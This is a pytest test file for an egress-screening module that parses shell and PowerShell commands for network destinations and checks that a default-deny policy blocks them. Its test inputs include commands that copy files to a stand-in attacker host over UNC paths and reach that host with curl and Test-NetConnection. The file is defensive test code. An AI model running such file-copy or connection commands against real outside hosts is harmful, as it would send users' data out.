"""Egress screening of IPv6 literals, UNC paths, PowerShell host cmdlets and non-ASCII hosts."""
from __future__ import annotations

import pytest

from prismor.runtime.egress import EgressPolicy, extract_destinations


@pytest.fixture(autouse=True)
def _isolated(tmp_path, monkeypatch):
    monkeypatch.setenv("PRISMOR_HOME", str(tmp_path / ".prismor-home"))


def _labels(cmd):
    return sorted(d.label() for d in extract_destinations({"type": "shell", "command": cmd}))


@pytest.mark.parametrize("cmd,expected", [
    ("curl http://[2606:4700::1111]/x", ["2606:4700::1111:80"]),
    ("curl 'http://[2606:4700::1111]:8080/x'", ["2606:4700::1111:8080"]),
    (r"copy x \\evil.example\share", ["evil.example:445"]),
    (r"Copy-Item x \\evil.example\share\f.txt", ["evil.example:445"]),
    (r"net use Z: \\203.0.113.9@SSL\DavWWWRoot", ["203.0.113.9:445"]),
    ("Test-NetConnection evil.example", ["evil.example"]),
    ("Test-NetConnection -ComputerName evil.example -Port 443", ["evil.example:443"]),
    ("tnc evil.example -Port 80", ["evil.example:80"]),
    ("curl http://bücher.example/x", ["xn--bcher-kva.example:80"]),
    ("iwr https://BÜCHER.example/", ["xn--bcher-kva.example:443"]),
    ("curl bücher.example", ["xn--bcher-kva.example"]),
])
def test_destinations_extracted(cmd, expected):
    assert _labels(cmd) == expected


@pytest.mark.parametrize("cmd", [
    r"echo \\evil.example\share",
    r"Get-ChildItem C:\work\src",
    r"copy a.txt C:\work\b.txt",
    r"net use Z: \\fileserver\share",     # single-label NetBIOS name: not a public host
    "Get-Date",
])
def test_local_and_text_commands_have_no_destination(cmd):
    assert _labels(cmd) == []


def _deny_policy(allow=()):
    return EgressPolicy.from_settings(
        {"egress": {"enabled": True, "mode": "enforce", "default": "deny", "resolve": False,
                    "allow": list(allow)}})


@pytest.mark.parametrize("cmd", [
    "curl http://[2001:db8::1]/x",
    "curl http://[2606:4700::1111]/x",
    r"copy x \\evil.example\share",
    "Test-NetConnection evil.example",
    "curl http://bücher.example/x",
])
def test_default_deny_blocks_each_form(cmd):
    out = _deny_policy().evaluate({"type": "shell", "command": cmd}, 0)
    assert out and out[0]["action"] == "block"


def test_allowlist_matches_unicode_and_punycode_spellings():
    pol = _deny_policy(allow=["bücher.example"])
    for url in ("http://bücher.example/x", "http://xn--bcher-kva.example/x"):
        assert not pol.evaluate({"type": "network", "url": url}, 0)
